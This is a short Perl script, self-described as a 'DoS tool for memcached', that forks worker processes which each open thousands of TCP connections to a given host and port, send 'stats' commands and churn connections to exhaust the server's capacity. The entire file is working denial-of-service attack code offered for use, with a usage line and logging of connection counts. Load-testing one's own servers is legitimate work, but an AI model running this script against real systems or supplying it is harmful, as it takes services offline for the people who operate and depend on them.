#!/usr/local/bin/perl

# DoS tool for memcached
# ulimit -n 15000; perl memcachedos.pl 127.0.0.1 11211 3
# original: http://gist.github.com/522741
# This is Public Domain Software

use strict;
use warnings;
use AnyEvent;
use AnyEvent::Socket;

die "$0 <host> <port> <fork num>" unless @ARGV;

# Options
my $maxconn = 10000;
my $activeconn = 900;

my $start_at = time;
my ($host, $port, $fork_num) = @ARGV;
if ($fork_num) {
    for (1..$fork_num) {
        my $pid = fork;
        if ($pid) { memcachedos() }
    }
} else {
    memcachedos();
}

sub memcachedos {
    my $cv = AE::cv;
    my ($i, $success, $fail, $closed) = (0,0,0,0);
    my $last_error = "";
    my @fh;

    my $closeconn = sub {
        my $nfh = int( rand(@fh) );
        my $fh = splice( @fh, $nfh, 1 );
        return unless $fh;
        my $ready; $ready = AE::io $fh, 1, sub {
            print $fh "stats\n";
            undef $ready;
            close $fh;
            $closed++;
        };
    };

    my $logger = AE::timer 0, 3, sub {
        printf "TIME:%s PID:%s Connect:%s Active:%s Success:%s Closed:%s Fail:%s Msg:%s\n", time - $start_at, $$,
          $i, scalar @fh, $success, $closed, $fail, $last_error;
    };

    # my $t1 = AE::timer 1000, 0, sub { $cv->send };
    my $t2 = AE::timer 0, 0.0001, sub {
        return if @fh > $maxconn;
        tcp_connect $host, $port, sub {
            $i++;
            my ($fh) = @_;
            if ( !$fh ) {
                $fail++;
                $last_error = $!;
                $closeconn->();
                return;
            }
            $success++;
            push @fh, $fh;
            my $ready;
            $ready = AE::io $fh, 1, sub {
                print $fh "stats\n";
                undef $ready;
            };

          }, sub { 0.1 }
    };

    my $t3 = AE::timer 0, 0.001, sub { $closeconn->() if ( $activeconn < @fh ) };
    $cv->recv;
}
